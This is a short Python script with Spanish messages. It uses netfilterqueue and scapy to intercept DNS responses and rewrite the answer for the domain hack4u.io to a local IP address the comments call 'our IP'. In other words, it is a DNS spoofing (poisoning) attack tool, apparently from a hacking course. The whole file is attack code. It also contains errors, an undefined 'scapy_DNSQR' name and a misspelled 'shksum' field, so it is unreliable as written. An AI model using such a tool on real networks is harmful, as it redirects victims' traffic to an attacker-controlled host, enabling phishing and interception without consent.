#!/usr/bin/env python3

import netfilterqueue
import signal
import sys
import scapy.all as scapy

def def_handler(sig, frame):
    print(f"\nSaliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    #if scapy_packet.haslayer(scapy.DNSQR):

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy_DNSQR].qname

        if b"hack4u.io" in qname:
            print(f"\nEnvenenando el cominio hack4u.io")

            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.38")#Ponemos nuestra IP
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].shksum

            packet.set_payload(scapy_packet.build())


    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
